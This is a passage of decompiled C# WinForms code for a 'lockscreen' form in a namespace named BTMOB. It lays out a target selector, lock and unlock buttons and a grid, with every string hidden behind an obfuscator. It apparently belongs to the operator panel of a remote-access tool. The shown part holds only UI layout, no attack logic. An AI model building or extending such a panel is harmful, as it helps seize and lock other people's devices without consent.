using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class lockscreen : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboTargts")]
	private DrakeUIComboBox _comboTargts;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inputtext2")]
	private DrakeUITextBox _inputtext2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("lockbtn")]
	private DrakeUIButtonIcon _lockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("unlockbtn")]
	private DrakeUIButtonIcon _unlockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refbtn")]
	private DrakeUIButtonIcon _refbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delbtn")]
	private DrakeUIButtonIcon _delbtn;

	public BTClient BTcli;

	[field: AccessedThroughProperty("Panel44")]
	internal virtual Panel Panel44
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctrtext")]
	internal virtual DrakeUISymbolLabel ctrtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lcktyplbl")]
	internal virtual DrakeUISymbolLabel lcktyplbl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboTargts
	{
		[CompilerGenerated]
		get
		{
			return _comboTargts;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboTargts_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboTargts;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboTargts = value;
			drakeUIComboBox = _comboTargts;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox inputtext2
	{
		[CompilerGenerated]
		get
		{
			return _inputtext2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = inputtext2_TextChanged;
			DrakeUITextBox drakeUITextBox = _inputtext2;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_inputtext2 = value;
			drakeUITextBox = _inputtext2;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	public virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGV0_CellClick;
			DataGridViewCellPaintingEventHandler value3 = DGV0_CellPainting;
			DataGridViewCellEventHandler value4 = DGV0_CellMouseEnter;
			DataGridViewCellEventHandler value5 = DGV0_CellMouseLeave;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellClick -= value2;
				dataGridView.CellPainting -= value3;
				dataGridView.CellMouseEnter -= value4;
				dataGridView.CellMouseLeave -= value5;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellClick += value2;
				dataGridView.CellPainting += value3;
				dataGridView.CellMouseEnter += value4;
				dataGridView.CellMouseLeave += value5;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W9")]
	internal virtual DrakeWidth_W DrakeWidth_W9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon lockbtn
	{
		[CompilerGenerated]
		get
		{
			return _lockbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = lockbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _lockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_lockbtn = value;
			drakeUIButtonIcon = _lockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon unlockbtn
	{
		[CompilerGenerated]
		get
		{
			return _unlockbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = unlockbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _unlockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_unlockbtn = value;
			drakeUIButtonIcon = _unlockbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon refbtn
	{
		[CompilerGenerated]
		get
		{
			return _refbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _refbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_refbtn = value;
			drakeUIButtonIcon = _refbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon delbtn
	{
		[CompilerGenerated]
		get
		{
			return _delbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _delbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_delbtn = value;
			drakeUIButtonIcon = _delbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W10")]
	internal virtual DrakeWidth_W DrakeWidth_W10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("partclm")]
	internal virtual DataGridViewTextBoxColumn partclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("adresclm")]
	internal virtual DataGridViewTextBoxColumn adresclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.lockscreen));
		this.Panel44 = new System.Windows.Forms.Panel();
		this.ctrtext = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.inputtext2 = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.lcktyplbl = new DrakeUI.Framework.DrakeUISymbolLabel();
		this.comboTargts = new DrakeUI.Framework.DrakeUIComboBox();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.DrakeWidth_W10 = new DrakeUI.Framework.DrakeWidth_W();
		this.delbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.unlockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W9 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.lockbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.refbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.partclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.adresclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel44.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		base.SuspendLayout();
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(659, 5);
		this.minibtn.Location = new System.Drawing.Point(701, 5);
		this.closbtn.Location = new System.Drawing.Point(743, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(775, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(785, 26);
		this.Panel44.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel44.Controls.Add(this.ctrtext);
		this.Panel44.Controls.Add(this.inputtext2);
		this.Panel44.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel44.Location = new System.Drawing.Point(2, 109);
		this.Panel44.Name = EXGuarder._583A021E;
		this.Panel44.Padding = new System.Windows.Forms.Padding(9);
		this.Panel44.Size = new System.Drawing.Size(785, 42);
		this.Panel44.TabIndex = 48;
		this.ctrtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ctrtext.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.ctrtext.ForeColor = System.Drawing.Color.White;
		this.ctrtext.Location = new System.Drawing.Point(136, 9);
		this.ctrtext.Name = EXGuarder._68584049;
		this.ctrtext.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
		this.ctrtext.Size = new System.Drawing.Size(640, 24);
		this.ctrtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.ctrtext.Symbol = 61508;
		this.ctrtext.SymbolColor = System.Drawing.Color.White;
		this.ctrtext.SymbolSize = 25;
		this.ctrtext.TabIndex = 17;
		this.ctrtext.Text = EXGuarder._07150515;
		this.ctrtext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.inputtext2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.inputtext2.Dock = System.Windows.Forms.DockStyle.Left;
		this.inputtext2.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.inputtext2.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.inputtext2.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.inputtext2.ForeColor = System.Drawing.Color.White;
		this.inputtext2.Location = new System.Drawing.Point(9, 9);
		this.inputtext2.Margin = new System.Windows.Forms.Padding(4);
		this.inputtext2.Maximum = 2147483647.0;
		this.inputtext2.Minimum = -2147483648.0;
		this.inputtext2.Name = EXGuarder._5A715240;
		this.inputtext2.Padding = new System.Windows.Forms.Padding(4);
		this.inputtext2.Radius = 15;
		this.inputtext2.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.inputtext2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.inputtext2.Size = new System.Drawing.Size(127, 25);
		this.inputtext2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.inputtext2.TabIndex = 19;
		this.inputtext2.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.inputtext2.Watermark = EXGuarder._054F0374;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.lcktyplbl);
		this.Panel3.Controls.Add(this.comboTargts);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 64);
		this.Panel3.Name = EXGuarder._06594949;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(785, 45);
		this.Panel3.TabIndex = 49;
		this.lcktyplbl.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lcktyplbl.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.lcktyplbl.ForeColor = System.Drawing.Color.White;
		this.lcktyplbl.Location = new System.Drawing.Point(136, 9);
		this.lcktyplbl.Name = EXGuarder._48255D2E;
		this.lcktyplbl.Padding = new System.Windows.Forms.Padding(29, 0, 0, 0);
		this.lcktyplbl.Size = new System.Drawing.Size(640, 27);
		this.lcktyplbl.Style = DrakeUI.Framework.UIStyle.Custom;
		this.lcktyplbl.Symbol = 61573;
		this.lcktyplbl.SymbolColor = System.Drawing.Color.White;
		this.lcktyplbl.SymbolSize = 25;
		this.lcktyplbl.TabIndex = 18;
		this.lcktyplbl.Text = EXGuarder._370E3806;
		this.lcktyplbl.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.comboTargts.Dock = System.Windows.Forms.DockStyle.Left;
		this.comboTargts.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboTargts.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboTargts.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.comboTargts.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboTargts.Items.AddRange(new object[3]
		{
			EXGuarder._5E0A1269,
			EXGuarder._6551255F,
			EXGuarder._1C316F6F
		});
		this.comboTargts.Location = new System.Drawing.Point(9, 9);
		this.comboTargts.Margin = new System.Windows.Forms.Padding(4);
		this.comboTargts.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboTargts.Name = EXGuarder._474F3954;
		this.comboTargts.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboTargts.Radius = 15;
		this.comboTargts.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboTargts.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboTargts.Size = new System.Drawing.Size(127, 25);
		this.comboTargts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboTargts.TabIndex = 2;
		this.comboTargts.Text = EXGuarder._5E0A1269;
		this.comboTargts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.DrakeWidth_W10);
		this.Panel4.Controls.Add(this.delbtn);
		this.Panel4.Controls.Add(this.unlockbtn);
		this.Panel4.Controls.Add(this.DrakeWidth_W9);
		this.Panel4.Controls.Add(this.DrakeWidth_W3);
		this.Panel4.Controls.Add(this.lockbtn);
		this.Panel4.Controls.Add(this.refbtn);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(2, 544);
		this.Panel4.Name = EXGuarder._126B6F2B;
		this.Panel4.Padding = new System.Windows.Forms.Padding(7);
		this.Panel4.Size = new System.Drawing.Size(785, 49);
		this.Panel4.TabIndex = 50;
		this.Panel4.Controls.SetChildIndex(this.refbtn, 0);
		this.Panel4.Controls.SetChildIndex(this.lockbtn, 0);
		this.Panel4.Controls.SetChildIndex(this.DrakeWidth_W3, 0);
		this.Panel4.Controls.SetChildIndex(this.DrakeWidth_W9, 0);
		this.Panel4.Controls.SetChildIndex(this.unlockbtn, 0);
		this.Panel4.Controls.SetChildIndex(this.delbtn, 0);
		this.Panel4.Controls.SetChildIndex(this.DrakeWidth_W10, 0);
		this.DrakeWidth_W10.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W10.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W10.Location = new System.Drawing.Point(519, 7);
		this.DrakeWidth_W10.Name = EXGuarder._4E6B2D69;
		this.DrakeWidth_W10.Size = new System.Drawing.Size(11, 35);
		this.DrakeWidth_W10.TabIndex = 53;
		this.delbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.delbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.delbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.delbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.delbtn.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.delbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.delbtn.Location = new System.Drawing.Point(147, 7);
		this.delbtn.Name = EXGuarder._220D5C5C;
		this.delbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.delbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.delbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.delbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.delbtn.Size = new System.Drawing.Size(119, 35);
		this.delbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.delbtn.Symbol = 61944;
		this.delbtn.TabIndex = 52;
		this.delbtn.Text = EXGuarder._1328720E;
		this.unlockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.unlockbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.unlockbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.unlockbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.unlockbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.unlockbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.unlockbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.unlockbtn.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.unlockbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.unlockbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.unlockbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.unlockbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.unlockbtn.Location = new System.Drawing.Point(530, 7);
		this.unlockbtn.Name = EXGuarder._2C460C1A;
		this.unlockbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.unlockbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.unlockbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.unlockbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.unlockbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.unlockbtn.Size = new System.Drawing.Size(119, 35);
		this.unlockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.unlockbtn.Symbol = 61596;
		this.unlockbtn.TabIndex = 50;
		this.unlockbtn.Text = EXGuarder._08762946;
		this.DrakeWidth_W9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W9.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W9.Location = new System.Drawing.Point(136, 7);
		this.DrakeWidth_W9.Name = EXGuarder._01143D12;
		this.DrakeWidth_W9.Size = new System.Drawing.Size(11, 35);
		this.DrakeWidth_W9.TabIndex = 9;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(649, 7);
		this.DrakeWidth_W3.Name = EXGuarder._79450336;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(10, 35);
		this.DrakeWidth_W3.TabIndex = 6;
		this.lockbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.lockbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.lockbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.lockbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.lockbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.lockbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.lockbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.lockbtn.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.lockbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.lockbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.lockbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.lockbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.lockbtn.Location = new System.Drawing.Point(659, 7);
		this.lockbtn.Name = EXGuarder._78716742;
		this.lockbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.lockbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.lockbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.lockbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.lockbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.lockbtn.Size = new System.Drawing.Size(119, 35);
		this.lockbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.lockbtn.Symbol = 61475;
		this.lockbtn.TabIndex = 49;
		this.lockbtn.Text = EXGuarder._08762946;
		this.refbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.refbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.refbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.refbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.refbtn.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		this.refbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.refbtn.Location = new System.Drawing.Point(7, 7);
		this.refbtn.Name = EXGuarder._652B6853;
		this.refbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.refbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.refbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.refbtn.RectSelectedColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.refbtn.Size = new System.Drawing.Size(119, 35);
		this.refbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.refbtn.Symbol = 61470;
		this.refbtn.TabIndex = 51;
		this.refbtn.Text = EXGuarder._79685549;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(638, 7);
		this.DrakeWidth_W2.Name = EXGuarder._2D572E12;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(11, 35);
		this.DrakeWidth_W2.TabIndex = 5;
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.ColumnHeadersVisible = false;
		this.DGV0.Columns.AddRange(this.partclm, this.adresclm);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.Location = new System.Drawing.Point(2, 163);
		this.DGV0.MultiSelect = false;
		this.DGV0.Name = EXGuarder._48356120;
		this.DGV0.ReadOnly = true;
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._65454576, 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
